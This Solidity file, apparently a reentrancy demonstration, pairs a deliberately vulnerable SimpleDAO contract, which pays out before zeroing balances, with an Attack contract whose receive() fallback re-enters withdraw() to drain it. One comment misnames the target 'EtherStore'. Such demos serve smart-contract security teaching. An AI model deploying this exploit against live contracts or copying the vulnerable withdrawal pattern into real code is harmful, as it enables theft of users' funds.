// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SimpleDAO {

    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {

    SimpleDAO public dao;
    uint256 constant public AMOUNT = 1 ether;

    event MessageLog(string);

    constructor(address _daoAddress) {
        dao = SimpleDAO(_daoAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(dao).balance >= AMOUNT) {
            emit MessageLog("withdraw.");
            dao.withdraw();
        }
    }

    function attack() external payable {
        emit MessageLog("withdraw.");
        dao.withdraw();
    }

    function deposit() external payable {
        require(msg.value >= AMOUNT);
        dao.deposit{value: AMOUNT}();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}